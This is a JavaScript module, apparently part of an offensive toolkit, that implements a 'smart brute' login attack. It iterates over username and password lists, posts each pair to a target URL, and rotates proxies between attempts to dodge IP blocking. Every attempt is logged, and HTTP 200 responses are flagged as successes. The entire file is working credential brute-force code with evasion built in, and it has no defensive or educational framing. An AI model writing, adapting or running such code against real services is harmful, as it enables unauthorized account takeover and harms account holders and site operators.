const axios = require('axios');
const chalk = require('chalk');
const { ProxyRotator } = require('./proxy_rotator');
const sessionLogger = require('./session_logger');

async function brute(config, sessionLog) {
    const { targetUrl, usernames, passwords, delayMs, maxAttempts, useProxy } = config.smartBrute;
    const results = [];
    let attempts = 0;

    const proxyRotator = useProxy ? new ProxyRotator(config.proxies) : null;
    let axiosInstance = axios;

    for (const username of usernames) {
        for (const password of passwords) {
            if (attempts >= maxAttempts) break;
            if (useProxy) {
                axiosInstance = await proxyRotator.createAxiosWithRotation(config, sessionLog);
            }
            sessionLog.push(await sessionLogger.log(config, {
                operation: 'smart_brute_attempt',
                details: `Testing ${username}:${password}`
            }));
            try {
                const response = await axiosInstance.post(targetUrl, { username, password }, { timeout: 5000 });
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: response.status === 200 ? 'Success' : 'Failed',
                    timestamp: new Date().toISOString(),
                    error: ''
                });
                console.log(chalk.cyan(`[ATTEMPT] ${username}:${password} -> ${response.status}`));
                sessionLog.push(await sessionLogger.log(config, {
                    operation: 'smart_brute_result',
                    details: `Status: ${response.status}`
                }));
            } catch (err) {
                results.push({
                    operation: 'smart_brute',
                    target: `${username}:${password}`,
                    result: 'Failed',
                    timestamp: new Date().toISOString(),
                    error: err.message
                });
                console.error(chalk.red(`[ERROR] ${username}:${password} -> ${err.message}`));
                sessionLog.push(await sessionLogger.log(config, {
                    operation: 'smart_brute_error',
                    details: `Error: ${err.message}`
                }));
                if (useProxy && err.code === 'ECONNREFUSED') {
                    proxyRotator.markProxyFailed(axiosInstance.defaults.proxy);
                }
            }
            await new Promise(resolve => setTimeout(resolve, delayMs));
            attempts++;
        }
    }
    return results;
}

module.exports = { brute };